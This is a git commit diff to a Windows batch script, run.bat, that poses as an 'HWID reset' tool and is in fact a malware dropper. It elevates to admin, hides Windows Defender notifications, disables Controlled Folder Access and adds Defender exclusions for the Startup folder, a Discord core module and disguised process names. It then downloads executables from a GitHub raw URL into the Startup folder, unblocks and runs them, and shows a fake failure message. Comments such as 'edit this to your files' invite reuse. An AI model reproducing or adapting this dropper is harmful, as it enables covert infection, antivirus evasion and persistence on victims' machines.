7f0ed287420acdc9f1573889416f12d6861749da
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-13 23:07:35 -0400

    Update run.bat
    Fixed file downloading

--- run.bat
+++ run.bat
@@ -1,4 +1,4 @@
-@echo off
+
 
 :: BatchGotAdmin
 ::-------------------------------------
@@ -22,24 +22,38 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-    echo msgbox "Attempting HWID reset..." > tmp.vbs
+    echo msgbox "Attempting HWID reset... This can take multiple minutes!" > tmp.vbs
     wscript tmp.vbs
     del tmp.vbs
-color 0a
+start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
+color 01
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 
-powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
+::disables ControlledFolderAccess to access files and folders
+powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
+::windows defender exclusions
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%appdata%\Local\Discord\app-1.0.9003\modules\discord_desktop_core-1\discord_desktop_core\'"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"WindowsDefender.exe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"WindowsScan.exe'"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"WindowsSysHealth.exe'"
 
 ::direct download link
-curl "https://github.com/YumYummity/usb-install/raw/main/install/WindowsScan.exe" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsScan.exe"
-curl "https://github.com/YumYummity/usb-install/raw/main/install/WindowsSysHealth.exe" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsSysHealth.exe"
+::edit this to your files
+curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/install/WindowsSysHealth.exe" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsSysHealth.exe"
+curl "https://raw.githubusercontent.com/YumYummity/usb-install/main/install/WindowsDefender.exe" --output "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsDefender.exe"
+::upload files here: github.com - create account and create repository (public) then upload files
+
 
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
+
+::run newly installed files
+::unblock files
+::change paths to file location
+powershell -command "unblock-file -path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsSysHealth.exe'"
+powershell -command "unblock-file -path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsDefender.exe'"
+start "WindowsSysHealth.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsSysHealth.exe"
+start "WindowsDefender.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.exe"
 echo msgbox "HWID reset failed." > tmp.vbs
 wscript tmp.vbs
 del tmp.vbs
-
-::run newly installed files
-::start /min /HIGH "winscanner" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsScan.exe"
-::start /min /HIGH "winsyshealth" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\WindowsSysHealth.exe"
